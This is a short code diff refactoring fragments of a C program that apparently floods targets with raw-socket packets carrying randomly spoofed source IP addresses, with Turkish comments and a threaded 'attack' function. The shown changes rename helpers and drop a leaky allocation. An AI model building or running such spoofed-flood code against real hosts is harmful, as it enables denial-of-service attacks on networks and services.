@@ -103,9 +103,7 @@ void *attack(void *arg){
             pthread_mutex_unlock(&mut);
         }
         // Random IP generate and assign 
-        char *str;
-        str = (char *)malloc(20 * sizeof(char *));
-        str = randomip(); 
+        char *str = random_ip();
         attack_param->psh.kaynak_adres = htons(atoi(str));
         attack_param->iph->saddr = inet_addr(str);
         attack_param->iph->id = htons(rand());  //Paketin ID'si
@@ -122,7 +120,7 @@ int main(int argc, char *argv[]){
         exit(0);
     }
     
-    tanitim();
+    tani_tim();
     
     struct thread_info th_param;                                               
     //Create raw socket
